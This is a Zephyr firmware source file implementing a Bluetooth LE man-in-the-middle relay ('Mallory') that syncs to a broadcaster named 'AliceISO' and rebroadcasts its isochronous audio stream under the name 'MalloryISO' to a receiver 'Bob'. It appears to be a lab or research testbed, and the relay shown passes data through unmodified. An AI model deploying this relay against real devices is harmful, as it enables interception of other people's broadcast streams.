/*
 * Copyright (c) 2021-2024 Nordic Semiconductor ASA
 *
 * SPDX-License-Identifier: Apache-2.0
 */

#include <zephyr/device.h>
#include <zephyr/devicetree.h>
#include <zephyr/drivers/gpio.h>
#include <zephyr/bluetooth/bluetooth.h>
#include <zephyr/bluetooth/conn.h>
#include <zephyr/bluetooth/hci_types.h>
#include <zephyr/bluetooth/iso.h>
#include <zephyr/sys/byteorder.h>

#include <zephyr/usb/usb_device.h>
#include <zephyr/drivers/uart.h>

#define TIMEOUT_SYNC_CREATE K_SECONDS(10)
#define NAME_LEN            30

// Scanning for Alice
#define BT_LE_SCAN_CUSTOM BT_LE_SCAN_PARAM(BT_LE_SCAN_TYPE_ACTIVE, \
                       BT_LE_SCAN_OPT_NONE, \
                       BT_GAP_SCAN_FAST_INTERVAL, \
                       BT_GAP_SCAN_FAST_WINDOW)

#define PA_RETRY_COUNT 6

#define BIS_ISO_CHAN_COUNT 2

NET_BUF_POOL_FIXED_DEFINE(tx_pool, 40, 251, 0, NULL);

static bool         per_adv_found;
static bool         per_adv_lost;
static bt_addr_le_t per_addr;
static uint8_t      per_sid;
static uint32_t     per_interval_us;
static uint32_t     iso_recv_count;

static K_SEM_DEFINE(sem_per_adv, 0, 1);
static K_SEM_DEFINE(sem_per_sync, 0, 1);
static K_SEM_DEFINE(sem_per_sync_lost, 0, 1);
static K_SEM_DEFINE(sem_per_big_info, 0, 1);
static K_SEM_DEFINE(sem_big_sync, 0, BIS_ISO_CHAN_COUNT);
static K_SEM_DEFINE(sem_big_sync_lost, 0, BIS_ISO_CHAN_COUNT);

static const struct bt_data ad[] = {
    BT_DATA_BYTES(BT_DATA_FLAGS, (BT_LE_AD_GENERAL | BT_LE_AD_NO_BREDR)),
    BT_DATA_BYTES(BT_DATA_UUID16_ALL, 0xaa, 0xfe),
    BT_DATA(BT_DATA_NAME_COMPLETE, "MalloryISO", 10),
};


static struct bt_iso_chan_io_qos iso_tx_qos = {
    .sdu = 40,
    .rtn = 2,
    .phy = BT_GAP_LE_PHY_2M,
};

static struct bt_iso_chan_qos iso_tx_chan_qos = {
    .tx = &iso_tx_qos,
};

static struct bt_iso_chan iso_tx_chan_1;
static struct bt_iso_chan iso_tx_chan_2;

static struct bt_iso_chan *iso_tx_chans[] = {
    &iso_tx_chan_1,
    &iso_tx_chan_2
};

static void iso_recv(struct bt_iso_chan *chan, const struct bt_iso_recv_info *info, struct net_buf *buf);
static void iso_connected(struct bt_iso_chan *chan);
static void iso_disconnected(struct bt_iso_chan *chan, uint8_t reason);

static struct bt_iso_chan_ops iso_ops = {
    .recv       = iso_recv,
    .connected  = iso_connected,
    .disconnected   = iso_disconnected,
};

static struct bt_iso_chan_io_qos iso_rx_qos[BIS_ISO_CHAN_COUNT];

static struct bt_iso_chan_qos bis_iso_qos[] = {
    { .rx = &iso_rx_qos[0], },
    { .rx = &iso_rx_qos[1], },
};

static struct bt_iso_chan bis_iso_chan[] = {
    { .ops = &iso_ops, .qos = &bis_iso_qos[0], },
    { .ops = &iso_ops, .qos = &bis_iso_qos[1], },
};

static struct bt_iso_chan *bis[] = {
    &bis_iso_chan[0],
    &bis_iso_chan[1],
};

static struct bt_iso_big_sync_param big_sync_param = {
    .bis_channels = bis,
    .num_bis = BIS_ISO_CHAN_COUNT,
    .bis_bitfield = (BIT_MASK(BIS_ISO_CHAN_COUNT)),
    .mse = BT_ISO_SYNC_MSE_ANY,
    .sync_timeout = 300,
};

static bool data_cb(struct bt_data *data, void *user_data)
{
    char *name = user_data;
    uint8_t len;

    switch (data->type) {
    case BT_DATA_NAME_SHORTENED:
    case BT_DATA_NAME_COMPLETE:
        len = MIN(data->data_len, NAME_LEN - 1);
        memcpy(name, data->data, len);
        name[len] = '\0';
        return false;
    default:
        return true;
    }
}

static const char *phy2str(uint8_t phy)
{
    switch (phy) {
    case 0: return "No packets";
    case BT_GAP_LE_PHY_1M: return "LE 1M";
    case BT_GAP_LE_PHY_2M: return "LE 2M";
    case BT_GAP_LE_PHY_CODED: return "LE Coded";
    default: return "Unknown";
    }
}

static void scan_recv(const struct bt_le_scan_recv_info *info,
              struct net_buf_simple *buf)
{
    char name[NAME_LEN];
    (void)memset(name, 0, sizeof(name));
    bt_data_parse(buf, data_cb, name);

    bool is_alice = (strcmp(name, "AliceISO") == 0);

    if (!per_adv_found && info->interval && is_alice) {
        printk("[MALLORY] FOUND ALICE! Syncing...\n");
        per_adv_found = true;
        per_sid = info->sid;
        per_interval_us = BT_CONN_INTERVAL_TO_US(info->interval);
        bt_addr_le_copy(&per_addr, info->addr);
        k_sem_give(&sem_per_adv);
    }
}

static struct bt_le_scan_cb scan_callbacks = {
    .recv = scan_recv,
};

static void sync_cb(struct bt_le_per_adv_sync *sync,
            struct bt_le_per_adv_sync_synced_info *info)
{
    printk("[MALLORY] Synced to Alice PA\n");
    k_sem_give(&sem_per_sync);
}

static void term_cb(struct bt_le_per_adv_sync *sync,
            const struct bt_le_per_adv_sync_term_info *info)
{
    printk("[MALLORY] Lost Alice PA Sync\n");
    per_adv_lost = true;
    k_sem_give(&sem_per_sync_lost);
}

static void recv_cb(struct bt_le_per_adv_sync *sync,
            const struct bt_le_per_adv_sync_recv_info *info,
            struct net_buf_simple *buf)
{
    // Periodic advertising data from Alice (not ISO data)
    printk("(dot)\n");
}

static void biginfo_cb(struct bt_le_per_adv_sync *sync,
               const struct bt_iso_biginfo *biginfo)
{
    printk("[MALLORY] Received Alice BIG Info\n");
    k_sem_give(&sem_per_big_info);
}

static struct bt_le_per_adv_sync_cb sync_callbacks = {
    .synced = sync_cb,
    .term = term_cb,
    .recv = recv_cb,
    .biginfo = biginfo_cb,
};

static void iso_recv(struct bt_iso_chan *chan, const struct bt_iso_recv_info *info,
        struct net_buf *buf)
{
    if (!(info->flags & BT_ISO_FLAGS_VALID)) {
        return;
    }
    if (buf->len == 0) {
        return;
    }

    int err;
    struct net_buf *tx_buf;

    int index = -1;
    if (chan == &bis_iso_chan[0]) index = 0;
    else if (chan == &bis_iso_chan[1]) index = 1;

    // Relay Logic
    if (index >= 0) {
        tx_buf = net_buf_alloc(&tx_pool, K_NO_WAIT);

        if (tx_buf) {
            net_buf_reserve(tx_buf, BT_ISO_CHAN_SEND_RESERVE);
            net_buf_add_mem(tx_buf, buf->data, buf->len);

            // Send the clean data to Bob
            err = bt_iso_chan_send(&iso_tx_chans[index][0], tx_buf, info->seq_num);
            if (err < 0) {
                net_buf_unref(tx_buf);
            }
        }
    }
}

static void iso_connected(struct bt_iso_chan *chan)
{
    printk("ISO Channel %p connected\n", chan);

    // If this is an RX channel, setup the data path
    if (chan == &bis_iso_chan[0] || chan == &bis_iso_chan[1]) {
        k_sem_give(&sem_big_sync);
    }
}

static void iso_disconnected(struct bt_iso_chan *chan, uint8_t reason)
{
    printk("ISO Channel %p disconnected (reason 0x%02x)\n", chan, reason);
    if (chan == &bis_iso_chan[0] || chan == &bis_iso_chan[1]) {
         if (reason != BT_HCI_ERR_OP_CANCELLED_BY_HOST) {
            k_sem_give(&sem_big_sync_lost);
        }
    }
}

static void reset_semaphores(void)
{
    k_sem_reset(&sem_per_adv);
    k_sem_reset(&sem_per_sync);
    k_sem_reset(&sem_per_sync_lost);
    k_sem_reset(&sem_per_big_info);
    k_sem_reset(&sem_big_sync);
    k_sem_reset(&sem_big_sync_lost);
}

int main(void)
{
    // USB Setup
    if (usb_enable(NULL)) return 0;
    const struct device *dev = DEVICE_DT_GET(DT_CHOSEN(zephyr_console));
    uint32_t dtr = 0;
    while (!dtr) {
        uart_line_ctrl_get(dev, UART_LINE_CTRL_DTR, &dtr);
        k_sleep(K_MSEC(100));
    }
    k_sleep(K_SECONDS(1));
    printk("=== MALLORY (MITM RELAY) STARTED ===\n");

    int err;

    // Initialize Bluetooth
    err = bt_enable(NULL);
    if (err) {
        printk("Bluetooth init failed (err %d)\n", err);
        return 0;
    }

    // Configure TX Channels
    iso_tx_chan_1.ops = &iso_ops;
    iso_tx_chan_1.qos = &iso_tx_chan_qos;
    iso_tx_chan_2.ops = &iso_ops;
    iso_tx_chan_2.qos = &iso_tx_chan_qos;

    // Create Advertising Set
    struct bt_le_ext_adv *adv;
    err = bt_le_ext_adv_create(BT_LE_EXT_ADV_NCONN, NULL, &adv);
    if (err) {
        printk("Failed to create advertising set (%d)\n", err);
        return 0;
    }

    // Set Advertising Data (Show name "MalloryISO")
    err = bt_le_ext_adv_set_data(adv, ad, ARRAY_SIZE(ad), NULL, 0);
    if (err) {
        printk("Failed to set advertising data (%d)\n", err);
        return 0;
    }

    // Start Advertising
    err = bt_le_ext_adv_start(adv, BT_LE_EXT_ADV_START_DEFAULT);
    if (err) {
        printk("Failed to start advertising (%d)\n", err);
        return 0;
    }
    printk("[TX] Advertising started as 'MalloryISO'\n");

    struct bt_le_per_adv_param per_adv_param = {
        .interval_min = BT_GAP_ADV_FAST_INT_MIN_2,
        .interval_max = BT_GAP_ADV_FAST_INT_MAX_2,
        .options = BT_LE_PER_ADV_OPT_NONE,
    };

    err = bt_le_per_adv_set_param(adv, &per_adv_param);
    if (err) {
        printk("Failed to set periodic advertising parameters (%d)\n", err);
        return 0;
    }

    err = bt_le_per_adv_start(adv);
    if (err) {
        printk("Failed to start periodic advertising (%d)\n", err);
        return 0;
    }
    printk("[TX] Periodic Advertising started. Now creating BIG...\n");

    // Create the BIG (Broadcast Isochronous Group) - The Pipe to Bob
    struct bt_iso_big_create_param big_create_param = {
        .num_bis = 2,
        .bis_channels = iso_tx_chans,
        .framing = BT_ISO_FRAMING_UNFRAMED,
        .packing = BT_ISO_PACKING_SEQUENTIAL,
        .interval = 10000,
        .latency = 10,
    };

    struct bt_iso_big *big_tx;
    err = bt_iso_big_create(adv, &big_create_param, &big_tx);
    if (err) {
        printk("Failed to create TX BIG (%d)\n", err);
        return 0;
    }
    printk("[TX] BIG created. Waiting for data to relay...\n");

	// Start Reception (Act as Bob to Alice)
    bt_le_scan_cb_register(&scan_callbacks);
    bt_le_per_adv_sync_cb_register(&sync_callbacks);

    struct bt_le_per_adv_sync_param sync_create_param;
    struct bt_le_per_adv_sync *sync;
    struct bt_iso_big *big_rx;
    uint32_t sem_timeout_us;

    do {
        reset_semaphores();
        per_adv_lost = false;

        // Start Scanning
        per_adv_found = false;
        printk("[RX] Scanning for Alice...\n");
        err = bt_le_scan_start(BT_LE_SCAN_CUSTOM, NULL);
        if (err) return 0;

        // Wait for Alice
        err = k_sem_take(&sem_per_adv, K_FOREVER);
        if (err) return 0;

        bt_le_scan_stop();
        printk("[RX] Found Alice. Creating Sync...\n");

        // Sync with Alice's PA
        bt_addr_le_copy(&sync_create_param.addr, &per_addr);
        sync_create_param.options = 0;
        sync_create_param.sid = per_sid;
        sync_create_param.skip = 0;
        sync_create_param.timeout = 0x190; 

        err = bt_le_per_adv_sync_create(&sync_create_param, &sync);
        if (err) {
            printk("Failed to create sync (%d)\n", err);
            continue;
        }

        // Wait for Sync Established
        err = k_sem_take(&sem_per_sync, K_SECONDS(2));
        if (err) {
            printk("Sync timeout. Retrying...\n");
            bt_le_per_adv_sync_delete(sync);
            continue;
        }

        // Wait for BIG Info
        err = k_sem_take(&sem_per_big_info, K_SECONDS(2));
        if (err) {
            bt_le_per_adv_sync_delete(sync);
            continue;
        }

        // Create BIG Sync (Connect to the stream)
        printk("[RX] Creating BIG Sync (Listening to Alice)...\n");
        err = bt_iso_big_sync(sync, &big_sync_param, &big_rx);
        if (err) {
            printk("Failed to sync BIG (%d)\n", err);
            continue;
        }

        // Wait for channels to be ready
        for (uint8_t chan = 0U; chan < BIS_ISO_CHAN_COUNT; chan++) {
            k_sem_take(&sem_big_sync, TIMEOUT_SYNC_CREATE);
        }
        printk("[RX] BIG Sync Established. Relay is ACTIVE.\n");

        // Wait until we lose sync
        k_sem_take(&sem_per_sync_lost, K_FOREVER);

        printk("[RX] Lost Sync with Alice. Cleaning up...\n");
        bt_iso_big_terminate(big_rx);
        bt_le_per_adv_sync_delete(sync);
		k_sleep(K_MSEC(1000));

    } while (true);
}